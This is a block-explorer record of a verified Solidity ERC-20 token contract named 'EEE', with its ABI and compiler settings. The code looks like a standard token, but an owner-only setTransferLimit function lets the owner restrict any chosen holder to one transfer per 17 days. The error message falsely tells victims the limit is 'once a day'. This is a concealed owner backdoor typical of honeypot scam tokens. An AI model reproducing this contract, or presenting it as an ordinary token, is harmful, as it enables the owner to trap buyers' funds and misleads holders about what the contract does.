{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.5;\r\n\r\n// Interface for ERC-20 token\r\ninterface IERC20 {\r\n    // Returns the total supply of the token\r\n    function totalSupply() external view returns (uint256);\r\n    \r\n    // Returns the balance of a specific account\r\n    function balanceOf(address account) external view returns (uint256);\r\n    \r\n    // Transfers a specified amount of tokens to the recipient\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    \r\n    // Returns the remaining allowance that spender has to spend on behalf of the owner\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    \r\n    // Approves a spender to spend a certain amount on behalf of the owner\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    \r\n    // Transfers a specified amount of tokens from one address to another\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    // Events to track token transfers and approvals\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// Abstract contract providing basic authorization control functions\r\nabstract contract Context {\r\n    // Returns the sender of the transaction\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\n// Contract to manage ownership\r\ncontract Ownable is Context {\r\n    // Address of the owner\r\n    address private _owner;\r\n    \r\n    // Event triggered when ownership is transferred\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    // Contract constructor sets initial owner to the sender account\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    // Returns the current owner\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    // Modifier that checks if the caller is the owner\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    // Allows the current owner to renounce ownership\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\n// ERC-20 token implementation\r\ncontract EEE is Context, Ownable, IERC20 {\r\n    // Balances of token holders\r\n    mapping(address => uint256) private _balances;\r\n    \r\n    // Allowances for spending tokens on behalf of others\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    \r\n    // Timestamps of the last token transfers for limited addresses\r\n    mapping(address => uint256) public limitedAddresses;\r\n    \r\n    // Time limit for transfers from limited addresses\r\n    uint256 public constant TIME_LIMIT = 17 days;\r\n\r\n    // Token details\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n\r\n    // Modifier to enforce transfer limit for specific addresses\r\n    modifier transferLimit(address user) {\r\n        if (limitedAddresses[user] != 0) {\r\n            require(block.timestamp - limitedAddresses[user] > TIME_LIMIT, \"Limited: Can only transfer once a day\");\r\n            limitedAddresses[user] = block.timestamp;\r\n        }\r\n        _;\r\n    }\r\n\r\n    // Contract constructor to initialize token details and allocate total supply to the owner\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    // Returns the token name\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    // Returns the token symbol\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    // Returns the token decimals\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    // Returns the total token supply\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    // Returns the balance of the specified account\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    // Allows the owner to set a transfer limit for a specific address\r\n    function setTransferLimit(address user) public onlyOwner {\r\n        limitedAddresses[user] = block.timestamp;\r\n    }\r\n\r\n    // Allows the owner to remove the transfer limit for a specific address\r\n    function removeTransferLimit(address user) public onlyOwner {\r\n        delete limitedAddresses[user];\r\n    }\r\n\r\n    // ERC-20 transfer function with transfer limit modifier\r\n    function transfer(address recipient, uint256 amount) public virtual override transferLimit(_msgSender()) returns (bool) {\r\n        require(_balances[_msgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n        _balances[_msgSender()] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    // Returns the remaining allowance for a spender on a specific owner's account\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    // Allows a spender to spend a specific amount on behalf of an owner\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    // ERC-20 transferFrom function with transfer limit modifier\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferLimit(sender) returns (bool) {\r\n        require(_allowances[sender][_msgSender()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][_msgSender()] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"TIME_LIMIT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitedAddresses\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"removeTransferLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"setTransferLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EEE", "CompilerVersion": "v0.8.5+commit.a4f2e591", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000900000000000000000000000000000000000000000000000000000002540be4000000000000000000000000000000000000000000000000000000000000000003454545000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034545450000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://67c00020e8a0d027109a5b8bbc58d5e74a70f2451c3a7c1cb1f5480be0a6d9b6"}